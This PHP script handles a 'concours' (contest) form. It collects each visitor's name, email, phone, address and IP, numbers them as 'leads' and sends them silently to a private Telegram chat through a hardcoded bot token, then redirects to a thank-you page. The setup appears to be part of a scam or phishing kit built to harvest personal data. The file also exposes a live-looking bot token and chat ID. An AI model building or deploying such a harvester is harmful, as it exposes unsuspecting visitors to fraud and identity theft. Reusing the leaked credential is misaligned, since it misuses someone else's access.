<?php
// ===============================
//  Telegram Handler for Concours
// ===============================
// REMPLACER ces deux valeurs par vos vraies informations Telegram
$botToken = '6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE';
$chatId   = '5061239044'; // ID perso ou ID groupe/canal

// IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . ' (proxy: ' . $ip . ')';
}

// Récupération sécurisée des champs du formulaire
$fullName  = $_POST['fullName']  ?? '';
$email     = $_POST['email']     ?? '';
$phone     = $_POST['phone']     ?? '';
$address   = $_POST['address']   ?? '';
// Les autres champs sont toujours récupérés mais ne sont plus envoyés dans le message.
$method    = $_POST['method']    ?? '';
$bonus     = $_POST['bonus']     ?? '';
$country   = $_POST['country']   ?? '';
$subdomain = $_POST['subdomain'] ?? '';
$city      = $_POST['city']      ?? '';
$postal    = $_POST['postal']    ?? '';

// Numérotation des formulaires envoyés
$leadNumberFile = __DIR__ . '/leads-counter.txt';
$leadNumber = 1;
if (file_exists($leadNumberFile)) {
    $leadNumber = (int)file_get_contents($leadNumberFile) + 1;
}
file_put_contents($leadNumberFile, (string)$leadNumber);

// ========================================================
// MESSAGE TÉLÉGRAM FINAL
// Contient uniquement: Numéro de lead, Nom, Email, Téléphone, Adresse complète et IP.
// ========================================================
$message  = "📨 Nouveau formulaire (#{$leadNumber})\n\n";
$message .= "👤 Nom : {$fullName}\n";
$message .= "📧 Email : {$email}\n";
$message .= "📱 Téléphone : {$phone}\n";
$message .= "🏠 Adresse complète : {$address}\n";
$message .= "💻 IP : {$ip}\n";


$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id'    => $chatId,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];

$context  = stream_context_create($options);
$result   = @file_get_contents($telegramUrl, false, $context);

// Redirection vers une page de remerciement
header('Location: thankyou.html');
exit;
?>